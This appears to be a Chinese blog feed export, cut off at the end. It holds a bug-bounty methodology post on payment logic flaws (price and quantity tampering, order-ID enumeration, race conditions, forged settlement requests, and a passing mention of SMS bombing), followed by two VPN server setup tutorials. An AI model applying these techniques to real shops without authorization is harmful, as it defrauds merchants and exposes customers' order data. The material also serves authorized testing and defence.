        <content type="html"><![CDATA[<p>参考：《逻辑漏洞挖掘有套路—支付漏洞挖掘》：<a href="http://falsespace.net/training.html" target="_blank" rel="noopener">http://falsespace.net/training.html</a></p><h2 id="一、现在src关注的重点"><a href="#一、现在src关注的重点" class="headerlink" title="一、现在src关注的重点"></a>一、现在src关注的重点</h2><p>​    随着常规漏洞的风险降低，以及挖掘难度的增加，现在的src更多的关注点，也就是白帽子关注的重点是逻辑漏洞。逻辑漏洞不要求有很深的基础，比如sql注入手工注入需要对sql注入有很深厚的理解；逻辑漏洞只需要对业务逻辑和关键参数有一定的了解，剩下的看运气。</p><a id="more"></a><h2 id="二、刷src之前的准备"><a href="#二、刷src之前的准备" class="headerlink" title="二、刷src之前的准备"></a>二、刷src之前的准备</h2><h3 id="1-信息收集（泛讲）"><a href="#1-信息收集（泛讲）" class="headerlink" title="1. 信息收集（泛讲）"></a>1. 信息收集（泛讲）</h3><p>​    渗透测试和漏洞挖掘，信息收集是贯彻于整个流程的；在进行src挖掘之前，要进行信息收集，在确定漏洞产生什么危害的时候，也要进行信息收集，也就是说渗透测试和漏洞挖掘的本质就是信息收集。</p><h3 id="2-具体要收集哪些信息"><a href="#2-具体要收集哪些信息" class="headerlink" title="2. 具体要收集哪些信息"></a>2. 具体要收集哪些信息</h3><ol><li><p>厂商域名和IP段（测试范围界定）</p><p>主站（可能防护较好），子站（子域名收集）</p><p>（明确测试范围，如果查出范围，有可能承担法律风险）</p></li><li><p>厂商业务信息（规划）</p><ul><li><p>如果业务架构较小，漏洞有限，不必去深挖</p></li><li><p>如果业务架构非常大，可以持久的挖</p></li></ul></li><li><p>子域名收集</p></li><li><p>IP段</p></li><li><p>端口（端口对应业务）</p></li><li><p>精准字典</p><ul><li><p>社工字典（站长信息，站点信息），</p><p>提高准确度，也增强自己的能力</p></li><li><p>不断收集字典，常见的（例：国人100弱密码）</p></li></ul></li><li><p>敏感接口</p><p>蛋糕那么小，人那么多，如果不选择一些不引人注意的范围进行利用的话，可能连粥都没得喝（简单例：如果接口外露，可以频繁的发起短信轰炸）</p></li><li><p>其他信息等</p></li></ol><h3 id="3-需要准备什么工具"><a href="#3-需要准备什么工具" class="headerlink" title="3. 需要准备什么工具"></a>3. 需要准备什么工具</h3><p>Burp suite and fiddler、Browser浏览器</p><p>或者仅需浏览器即可</p><h2 id="三、挖掘思路"><a href="#三、挖掘思路" class="headerlink" title="三、挖掘思路"></a>三、挖掘思路</h2><h3 id="1-锁定关键变量与深入逻辑"><a href="#1-锁定关键变量与深入逻辑" class="headerlink" title="1. 锁定关键变量与深入逻辑"></a>1. 锁定关键变量与深入逻辑</h3><ul><li><p>锁定关键可控变量</p></li><li><p>深入了解逻辑，进一步绕过</p></li></ul><p>​    不是单纯的靠工具跑出来，用工具跑出来的漏洞，不能叫漏洞了，因为没有你任何价值的体现。</p><p>​    例如sql注入关键变量是一个id的话，此时就要深入的判断它的一些字符型、数字型以及对它的逻辑进一步去挖掘。</p><p>​    所以说不管挖哪些漏洞，其实本质就是这个样子的，首先锁定一个关键的漏洞，紧接着深入了解一下他的逻辑具体是什么样子的，然后进一步的进行绕过。</p><h3 id="2-逻辑漏洞的定义"><a href="#2-逻辑漏洞的定义" class="headerlink" title="2. 逻辑漏洞的定义"></a>2. 逻辑漏洞的定义</h3><p>由于程序逻辑不严谨，导致逻辑未能正常处理或处理错误的漏洞成为逻辑漏洞。</p><p>零信任原则：不管用户输入任何东西，都是零信任的。</p><h3 id="3-了解逻辑业务"><a href="#3-了解逻辑业务" class="headerlink" title="3. 了解逻辑业务"></a>3. 了解逻辑业务</h3><p>如果不了解业务，就开始找漏洞，可能就会陷入盲目，比较费时间，并且没有任何成果，打消自己的自信力；所以先对业务有一定的了解，哪个模块可能会出现那些漏洞</p><p>例如表单，一般会跟数据库有交互，就可能存在sql注入</p><p>以下为参考</p><ul><li>电商行业</li></ul><p><img src="/2019/04/07/逻辑漏洞挖掘思路-支付逻辑/1554553268179.png" alt="1554553268179"></p><ul><li>P2P金融</li></ul><p><img src="/2019/04/07/逻辑漏洞挖掘思路-支付逻辑/1554553286437.png" alt="1554553286437"></p><h2 id="四、支付漏洞挖掘"><a href="#四、支付漏洞挖掘" class="headerlink" title="四、支付漏洞挖掘"></a>四、支付漏洞挖掘</h2><p>在支付环节中由于逻辑不严谨而产生的漏洞称为支付漏洞</p><p>src不会拒绝的，其他的可能会打擦边球，但是涉及到钱的问题，对商家或厂家是重中之重</p><h3 id="1-明确挖洞步骤"><a href="#1-明确挖洞步骤" class="headerlink" title="1. 明确挖洞步骤"></a>1. 明确挖洞步骤</h3><ol><li>明确支付点</li><li>寻找关键可控变量</li><li>抓包放包对比</li></ol><h3 id="2-技巧"><a href="#2-技巧" class="headerlink" title="2. 技巧"></a>2. 技巧</h3><ul><li><p>两个账号A、B</p></li><li><p>A走一遍流程；</p></li><li><p>B负责在A账号正常流程破坏的</p></li></ul><p>例：找回密码</p><h3 id="3-支付流程"><a href="#3-支付流程" class="headerlink" title="3. 支付流程"></a>3. 支付流程</h3><p>用户订购：</p><ul><li>信息泄露/越权<ul><li>id+/-</li></ul></li></ul><p>↓</p><p>金额：</p><ul><li><p>修改金额</p><ul><li>正负逻辑</li><li>0.01模式</li><li>最大值越界</li></ul></li><li><p>积分换购</p><ul><li>积分抵扣</li><li>积分兑换</li></ul></li></ul><p>↓</p><p>生成订单：</p><ul><li>更改状态<ul><li>接口更改</li><li>更改关键值</li></ul></li></ul><p>↓</p><p>扣除金额</p><p>↓</p><p>库存 - 1</p><ul><li>多线程并发（-99999999）影响交易</li></ul><p>↓</p><p>收货阶段</p><ul><li>确认收货<ul><li>绕过客户直接确认收货</li></ul></li><li>退货<ul><li>更改货物状态</li><li>更改退货价格</li></ul></li></ul><h3 id="4-具体思路"><a href="#4-具体思路" class="headerlink" title="4. 具体思路"></a>4. 具体思路</h3><p><strong>一、订单模块</strong></p><ol><li>下单之后修改商品价格</li><li>下单之后更改数量设为负数，产生正负逻辑</li><li>并发购买是否出现逻辑问题</li><li>商品为0，是否存在购买的可能</li><li>生成订单时修改订单金额</li></ol><p><strong>二、结算模块</strong></p><ol><li>优惠劵重复利用</li><li>修改结算的状态</li><li>更改支付的API或者支付模式（转为第三方）</li><li>伪造成功结算的请求</li></ol><p><strong>三、退货模块</strong></p><ol><li>更改货物状态</li><li>更改退货价格</li></ol><p><strong>四、收货模块</strong></p><ol><li>绕过客户直接确认收货</li></ol><h3 id="5-具体场景"><a href="#5-具体场景" class="headerlink" title="5. 具体场景"></a>5. 具体场景</h3><p><img src="/2019/04/07/逻辑漏洞挖掘思路-支付逻辑/1554555632056.png" alt="1554555632056"></p><h3 id="6-举例"><a href="#6-举例" class="headerlink" title="6. 举例"></a>6. 举例</h3><h4 id="1-信息泄露-越权"><a href="#1-信息泄露-越权" class="headerlink" title="1. 信息泄露/越权"></a>1. 信息泄露/越权</h4><p><strong>例1：</strong></p><p>第一步：明确支付点：购票</p><p>第二步：寻找关键可控变量</p><p>关键变量：</p><ul><li>订单id和用户id（变量未加密）</li><li>变量加密<ul><li>前端JS加密</li><li>Ajax异步加载请求</li><li>后端加密</li></ul></li></ul><p>第三步：抓包放包对比</p><ul><li>订单id增减，用户id增减，同时增减（平行越权造成订单信息泄露）</li></ul><p><strong>例2：</strong></p><p>第一步：明确支付点：酒店预订</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：订单id和价格变量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>订单id增减，实现订单遍历</p><h4 id="2-正负逻辑：修改数量"><a href="#2-正负逻辑：修改数量" class="headerlink" title="2. 正负逻辑：修改数量"></a>2. 正负逻辑：修改数量</h4><p><strong>例3：</strong></p><p>第一步：明确支付点：购买商品</p><p>第二步：寻找关键可控变量（币的数量）</p><ul><li>关键变量：价格变量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>更改价格（币的数量）</p><p><strong>例4：</strong></p><p>第一步：明确支付点：积分换币</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：币数量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>更改币的数量</p><h4 id="3-正负逻辑：支付价格变动"><a href="#3-正负逻辑：支付价格变动" class="headerlink" title="3. 正负逻辑：支付价格变动"></a>3. 正负逻辑：支付价格变动</h4><p><strong>例5：</strong></p><p>第一步：明确支付点：购物</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：价格变量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>更改Price可增加余额</p><h4 id="4-正负逻辑：修改附属值"><a href="#4-正负逻辑：修改附属值" class="headerlink" title="4. 正负逻辑：修改附属值"></a>4. 正负逻辑：修改附属值</h4><p><strong>例6：</strong></p><p>第一步：明确支付点：兑换物品（积分+金额模式付款）</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：金额变量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>金额变量变化，最终支付价格也会变化</p><h4 id="5-0-01模式"><a href="#5-0-01模式" class="headerlink" title="5. 0.01模式"></a>5. 0.01模式</h4><p>0.01模式：逻辑判断价格不能为负数</p><p><strong>例7：</strong></p><p>第一步：明确支付点：购买保险</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：金额变量（一个或多个）（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>金额变量变化，最终支付价格也会变化</p><p>### </p><h2 id="五、支付漏洞修复建议"><a href="#五、支付漏洞修复建议" class="headerlink" title="五、支付漏洞修复建议"></a>五、支付漏洞修复建议</h2><p><img src="/2019/04/07/逻辑漏洞挖掘思路-支付逻辑/1554557520785.png" alt="1554557520785"></p><h2 id="六、漏洞报告"><a href="#六、漏洞报告" class="headerlink" title="六、漏洞报告"></a>六、漏洞报告</h2><p>漏洞报告最好具有规范性</p><p><strong>一般内容</strong>：</p><ul><li><p>漏洞标题</p></li><li><p>漏洞等级</p></li><li><p>漏洞影响范围</p></li><li><p>漏洞证明信息</p></li><li><p>漏洞修复建议</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 业务逻辑漏洞 </tag>
            
            <tag> 支付逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 2008 R2 搭建VPN服务</title>
      <link href="/2019/04/07/Windows-2008-R2-%E6%90%AD%E5%BB%BAVPN%E6%9C%8D%E5%8A%A1/"/>
      <url>/2019/04/07/Windows-2008-R2-%E6%90%AD%E5%BB%BAVPN%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h1><p>​    虚拟私人网络（Virtual Private Network，缩写为VPN）是一种常用于连接中、大型企业或团体与团体间的私人网络的通讯方法。它利用隧道协议（Tunneling Protocol）来达到保密、发送端认证、消息准确性等私人消息安全效果，这种技术可以用不安全的网络（例如：互联网）来发送可靠、安全的消息。</p><pre><code>通常情况下，VPN网关采取双网卡结构，外网卡使用公网IP接入Internet。</code></pre> <a id="more"></a><h1 id="二、搭建步骤"><a href="#二、搭建步骤" class="headerlink" title="二、搭建步骤"></a>二、搭建步骤</h1><ol><li>安装VPN服务，打开服务器管理器-添加角色</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps1.jpg" alt="img"> </p><ol start="2"><li>点击添加角色，下一步，勾选网络策略和访问服务，下一步是网络策略访问的简介</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps2.jpg" alt="img"> </p><ol start="3"><li>勾选网络策略服务器，和路由访问，然后下一步，继续安装</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps3.jpg" alt="img"> </p><ol start="4"><li>安装完成</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps4.jpg" alt="img"> </p><ol start="5"><li>安装完成之后，在服务器管理器中找到路由和远程访问，并且进行配置</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps5.jpg" alt="img"> </p><ol start="6"><li>配置点击下一步，选择自定义配置</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps6.jpg" alt="img"> </p><ol start="7"><li>然后下一步勾选VPN访问，点击完成即可！</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps7.jpg" alt="img"> </p><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps8.jpg" alt="img"> </p><ol start="8"><li>完成之后需要启动路由和远程访问功能</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps9.jpg" alt="img"> </p><ol start="9"><li>安装完成之后，开始配置VPN，找到路由和远程访问，IPV4展开之后，出现常规，选中常规右键新增路由协议</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps10.jpg" alt="img"> </p><ol start="10"><li>在添加的路由协议中，选择NAT路由协议。</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps11.jpg" alt="img"> </p><ol start="11"><li>上步选择了NAT，现在配置NAT，在NAT上右键新增接口</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps12.jpg" alt="img"> </p><ol start="12"><li>然后把“内部”接口也添加上，并“右键”——”属性“如下设置：</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps13.jpg" alt="img"> </p><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps14.jpg" alt="img"> </p><ol start="13"><li>创建VPN帐号，测试VPN服务器是否正常。在计算机右键管理，选择配置，本地用户和组，还要把拨入属性选项卡中的网络访问权限选择为 允许访问。</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps15.jpg" alt="img"> </p><ol start="14"><li>至此，完成了VPN服务器端的配置</li></ol><h1 id="三、连接测试"><a href="#三、连接测试" class="headerlink" title="三、连接测试"></a>三、连接测试</h1><p>​    使用另外一台不同网段的机器，新建VPN拨号连接，登录VPN服务器上的测试帐号</p><ol><li>配置连接属性</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps16.jpg" alt="img"> </p><ol start="2"><li>开始连接 </li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps17.jpg" alt="img"> </p><ol start="3"><li>连接成功 </li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps18.jpg" alt="img"> </p><ol start="4"><li>查看IP </li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps19.jpg" alt="img"> </p><ol start="5"><li>本机IP </li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps20.jpg" alt="img"> </p><p>至此，完成了VPN客户端的连接</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows Server </tag>
            
            <tag> OpenVPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu16搭建OpenVPN服务</title>
      <link href="/2019/04/07/Ubuntu16%E4%B8%8B%E6%90%AD%E5%BB%BAOpenVPN%E6%9C%8D%E5%8A%A1/"/>
      <url>/2019/04/07/Ubuntu16%E4%B8%8B%E6%90%AD%E5%BB%BAOpenVPN%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="一、参考"><a href="#一、参考" class="headerlink" title="一、参考"></a>一、参考</h2><p><a href="https://blog.csdn.net/u012843189/article/details/77422505" target="_blank" rel="noopener">Ubuntu16.04搭建OpenVPN</a><br><a href="https://cndaqiang.github.io/2017/09/27/ubuntu1604-openvpn/" target="_blank" rel="noopener">Ubuntu16.04搭建openvpn服务器</a></p><h2 id="二、环境"><a href="#二、环境" class="headerlink" title="二、环境"></a>二、环境</h2><p>Ubuntu 16.10 yakkety (GNU/Linux 4.8.0-22-generic x86_64)</p><h2 id="三、介绍"><a href="#三、介绍" class="headerlink" title="三、介绍"></a>三、介绍</h2><p><strong>VPN</strong>（Virtual Private Network，虚拟私人网络）是一种常用于连接中、大型企业或团体与团体间的私人网络的通讯方法。它利用<a href="https://zh.wikipedia.org/wiki/%E9%9A%A7%E9%81%93%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">隧道协议</a>（Tunneling Protocol）来达到保密、发送端认证、消息准确性等私人消息安全效果，这种技术可以用不安全的网络（例如：互联网）来发送可靠、安全的消息。</p><h2 id="四、安装"><a href="#四、安装" class="headerlink" title="四、安装"></a>四、安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openvpn easy-rsa</span><br></pre></td></tr></table></figure><a id="more"></a><p><code>easy-rsa</code>内部CA（certificate authority）证书生成软件</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554386400868.png" alt="1554386400868"></p><h2 id="五、证书制作"><a href="#五、证书制作" class="headerlink" title="五、证书制作"></a>五、证书制作</h2><h3 id="1-证书配置"><a href="#1-证书配置" class="headerlink" title="1. 证书配置"></a>1. 证书配置</h3><p>复制证书制作工具到文件夹(该文件夹应该不存在，复制后自动创建该文件夹)，<code>make-cadir</code>为easy-rsa安装后增加的命令 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make-cadir /etc/openvpn/ca</span><br><span class="line">cd /etc/openvpn/ca</span><br></pre></td></tr></table></figure><p>更改证书默认设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim vars</span><br></pre></td></tr></table></figure><p>以下内容为证书的默认内容，可自定义，不能为空</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">export KEY_COUNTRY=&quot;US&quot;</span><br><span class="line">export KEY_PROVINCE=&quot;CA&quot;</span><br><span class="line">export KEY_CITY=&quot;SanFrancisco&quot;</span><br><span class="line">export KEY_ORG=&quot;Fort-Funston&quot;</span><br><span class="line">export KEY_EMAIL=&quot;me@myhost.mydomain&quot;</span><br><span class="line">export KEY_OU=&quot;MyOrganizationalUnit&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554386592562.png" alt="1554386592562"></p><p>下面有个KEY_NAME，值可自定义，例如heiheihei</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KEY_NAME=&quot;heiheihei&quot;</span><br></pre></td></tr></table></figure><p>保存退出</p><p>现在可以使用刚才设置的变量，用easy-rsa包来制作CA。确保在CA目录下面，然后source编辑过的vars文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source vars</span><br></pre></td></tr></table></figure><p>如果source正确的话，会看到如下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NOTE: If you run ./clean-all, I will be doing a rm -rf on /etc/openvpn/ca/keys</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554386666693.png" alt="1554386666693"></p><h3 id="2-CA证书"><a href="#2-CA证书" class="headerlink" title="2. CA证书"></a>2. CA证书</h3><p>CA数字证书认证机构,负责颁发证书，用于openvpn服务器和客户端的认证</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./clean-all//确保我们的操作处于一个clean环境中</span><br><span class="line">./build-ca//之后需要一直回车确认</span><br><span class="line">./build-ca [--batch]//保持默认设置，无须回车确认</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554387418885.png" alt="1554387418885"></p><h3 id="3-服务器证书"><a href="#3-服务器证书" class="headerlink" title="3. 服务器证书"></a>3. 服务器证书</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-key-server --batch heiheihei</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554429618321.png" alt="1554429618321"></p><p>heiheihei为之前vars里<code>export KEY_NAME=&quot;heiheihei&quot;</code>的值，自定义后，后面需要修改服务器配置文件中相应内容。</p><p>client名称也可自定义,如果修改，最后在客户端配置文件中，也更改对应名称。</p><h3 id="4-制作Diffie-Hellman-key"><a href="#4-制作Diffie-Hellman-key" class="headerlink" title="4. 制作Diffie-Hellman key"></a>4. 制作Diffie-Hellman key</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-dh</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554429922860.png" alt="1554429922860"></p><p>等待几分钟时间完成</p><h3 id="5-生成HMAC签名加强TLS认证"><a href="#5-生成HMAC签名加强TLS认证" class="headerlink" title="5. 生成HMAC签名加强TLS认证"></a>5. 生成HMAC签名加强TLS认证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openvpn --genkey --secret keys/ta.key</span><br></pre></td></tr></table></figure><h3 id="6-客户端证书"><a href="#6-客户端证书" class="headerlink" title="6. 客户端证书"></a>6. 客户端证书</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-key --batch client</span><br></pre></td></tr></table></figure><p>client名称可自定义,如果修改需要后面在客户端配置文件中，更改对应内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cert client.crt</span><br><span class="line">key client.key</span><br></pre></td></tr></table></figure><h2 id="六、服务端配置"><a href="#六、服务端配置" class="headerlink" title="六、服务端配置"></a>六、服务端配置</h2><h3 id="1-移动证书"><a href="#1-移动证书" class="headerlink" title="1. 移动证书"></a>1. 移动证书</h3><p>进入keys目录可以看到生成的证书文件 我们需要<strong>ca.crt ca.key heiheihei.crt heiheihei.key ta.key dh2048.pem</strong> ，heiheihei为之前自定义的服务器证书名</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554430607611.png" alt="1554430607611"></p><p>复制证书文件到/etc/openvpn 当前目录是<code>/etc/openvpn/ca/keys</code>，所以<code>../../</code>就是配置目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ca.crt ca.key uuu.crt uuu.key ta.key dh2048.pem ../../</span><br></pre></td></tr></table></figure><h3 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2. 修改配置文件"></a>2. 修改配置文件</h3><p>复制配置文件模板到<code>/etc/openvpn/</code>,解压后修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz .</span><br><span class="line">gzip -d server.conf.gz</span><br><span class="line">sudo vim server.conf</span><br></pre></td></tr></table></figure><p>以下内容替换为证书的路径名称，同路径下可直接写名称</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca ca.crt</span><br><span class="line">cert server.crt</span><br><span class="line">key server.key </span><br><span class="line"></span><br><span class="line">dh dh2048.pem</span><br></pre></td></tr></table></figure><p>这里我替换成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca ca.crt</span><br><span class="line">cert heiheihei.crt</span><br><span class="line">key heiheihei.key</span><br><span class="line"></span><br><span class="line">dh dh2048.pem</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554430900402.png" alt="1554430900402"></p><p>如果服务器证书一开始就命名为server默认值，这里就不用修改了</p><p>去掉下面的注释，并再下一行添加<code>key-direction 0</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;tls-auth ta.key 0 # This file is secret</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554431450577.png" alt="1554431450577"></p><p>最后，找到user和group参数，去除它们之前的<code>;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;user nobody</span><br><span class="line">;group nogroup</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554431475663.png" alt="1554431475663"></p><p><strong>（可选配置）推动DNS更改让VPN重定向所有流量</strong></p><p>上面的配置可以在客户端和服务器端上创建VPN连接，但是没有强迫连接去使用tunnel。如果希望用VPN来路由所有流量，需要更改客户端机器的DNS设置。</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554431815982.png" alt="1554431815982"></p><p>这样就可以协助客户版重新配置DNS，以便使用VPN tunnel来作为默认网关。</p><p><strong>（可选配置）修改OpenVPN服务器的端口和协议</strong></p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554431906735.png" alt="1554431906735"></p><p>如果没有更换端口的需求，最好将上述的两项保持默认设置。</p><h3 id="3-防火墙设置"><a href="#3-防火墙设置" class="headerlink" title="3. 防火墙设置"></a>3. 防火墙设置</h3><h4 id="1-打开ip转发"><a href="#1-打开ip转发" class="headerlink" title="1. 打开ip转发"></a>1. 打开ip转发</h4><p>我们需要让服务器来转发流量，这是需要VPN服务器来提供的最基本的功能。可以通过修改/etc/sysctl.conf文件来调整网络设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>取消注释<code>net.ipv4.ip_forward</code>，完成后保存并退出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure><p>读取sysctl.conf文件并且让调整后设置对当前系统的session生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -p</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554432065420.png" alt="1554432065420"></p><h4 id="2-添加规则"><a href="#2-添加规则" class="headerlink" title="2. 添加规则"></a>2. 添加规则</h4><p><strong>调整防火墙（UFW）规则</strong></p><p>配置防火墙规则来引导进入服务器的一些流量，需要修改防火墙规则文件来建立伪装规则，iptables的概念用于提供动态的NAT，从而正确地路由客户端连接。在打开防火墙配置文件以添加伪装规则之前，需要找到Ubuntu服务器的公共网络接口，输入如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route | grep default</span><br></pre></td></tr></table></figure><p>公共网络接口应当紧跟在单词”dev”后面，例如，我的接口名字为ens33：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default via 172.18.31.253 dev ens33</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554432573267.png" alt="1554432573267"></p><p>打开/etc/ufw/before.rules这个文件并添加相应的规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/ufw/before.rules</span><br></pre></td></tr></table></figure><p>在最前面填入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># START OPENVPN RULES</span><br><span class="line"># NAT table rules</span><br><span class="line">*nat</span><br><span class="line">:POSTROUTING ACCEPT [0:0] </span><br><span class="line"># Allow traffic from OpenVPN client to eth0</span><br><span class="line">-A POSTROUTING -s 10.8.0.0/8 -o ens33 -j MASQUERADE</span><br><span class="line">COMMIT</span><br><span class="line"># END OPENVPN RULES</span><br></pre></td></tr></table></figure><p>其中10.8.0.0/8为openvpn客户端获取的ip，如在server.conf里面修改，此处应替换为相应ip，ens33为ubuntu连接网络的网卡</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554432778966.png" alt="1554432778966"></p><p>然后告诉防火墙默认允许转发包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/default/ufw</span><br></pre></td></tr></table></figure><p>将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_FORWARD_POLICY=&quot;DROP&quot;</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 